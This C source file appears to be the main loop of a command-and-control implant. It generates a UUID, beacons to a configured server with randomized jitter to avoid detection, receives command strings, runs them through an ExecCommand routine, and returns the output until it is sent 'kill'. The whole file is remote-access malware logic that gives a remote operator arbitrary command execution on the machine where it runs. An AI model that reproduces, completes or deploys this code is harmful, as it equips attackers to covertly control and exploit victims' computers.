#define _XOPEN_SOURCE 600
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #define SleepMs(ms) Sleep(ms)
#else
    #include <unistd.h>
    #define SleepMs(ms) usleep((ms) * 1000)
#endif

#include "../include/Config.h"
#include "../include/Identity.h"
#include "../include/Beacon.h"
#include "../include/Exec.h"

static int Jitter(int Base, int Pct)
{
    int D = (Base * Pct) / 100;
    if (D == 0) return Base;
    return (Base - D) + (rand() % (2 * D + 1));
}

int main(int Argc, char *Argv[])
{
    srand((unsigned)time(NULL));

    AgentConfig C;
    AgentConfigDefaults(&C);
    AgentConfigParse(Argc, Argv, &C);

    char Uuid[UuidLen];
    IdentityGenerate(Uuid);

    char Msg[BufSize]  = "Standby";
    char Resp[BufSize] = {0};

    while (1) {
        memset(Resp, 0, BufSize);

        if (!BeaconSend(&C, Uuid, Msg, Resp)) {
            strncpy(Msg, "Standby", BufSize - 1);
            SleepMs(Jitter(C.BeaconMs * 2, C.JitterPct));
            continue;
        }

        if (!strcmp(Resp, "kill")) break;

        if (!strcmp(Resp, "SLEEP") || !strlen(Resp))
            strncpy(Msg, "Standby", BufSize - 1);
        else
            ExecCommand(Resp, Msg, BufSize);

        SleepMs(Jitter(C.BeaconMs, C.JitterPct));
    }

    return 0;
}
